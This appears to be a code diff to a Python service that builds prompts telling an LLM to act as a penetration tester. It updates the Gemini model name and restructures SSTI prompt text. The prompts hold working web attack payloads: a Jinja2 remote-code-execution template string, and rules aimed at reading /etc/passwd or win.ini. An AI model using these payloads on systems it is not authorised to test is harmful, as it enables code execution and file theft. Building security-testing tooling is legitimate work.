@@ -9,7 +9,7 @@ class LLMService:
     def __init__(self):
         self.api_key = settings.GOOGLE_API_KEY
         self.client = httpx.AsyncClient(timeout=90.0)
-        self.model = "gemini-2.5-flash-preview-04-17"
+        self.model = "gemini-2.5-flash"
         self.url = f"https://generativelanguage.googleapis.com/v1beta/models/{self.model}:generateContent?key={self.api_key}"
 
     async def call_llm(self, prompt: str):
@@ -139,9 +139,7 @@ RULES:
 - The goal is to read /etc/passwd on Linux or win.ini on Windows."""
 
         if "SSTI" in vuln_upper or "TEMPLATE INJECTION" in vuln_upper:
-            return f"""You are an expert Server-Side Template Injection (SSTI) penetration tester.
-{header}
-
+            ssti_payloads = """
 Generate exactly 5 UNIQUE SSTI payloads across different template engines:
 1. Jinja2/Python detection: {{{{7*7}}}} — should return 49
 2. Jinja2 RCE: {{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}
@@ -152,6 +150,10 @@ Generate exactly 5 UNIQUE SSTI payloads across different template engines:
 RULES:
 - Payloads must use the actual template engine syntax, not pseudocode.
 - Start with detection (arithmetic) before jumping to RCE."""
+            return f"""You are an expert Server-Side Template Injection (SSTI) penetration tester.
+{header}
+
+{ssti_payloads}"""
 
         if "XXE" in vuln_upper or "XML EXTERNAL" in vuln_upper:
             return f"""You are an expert XXE (XML External Entity) penetration tester.
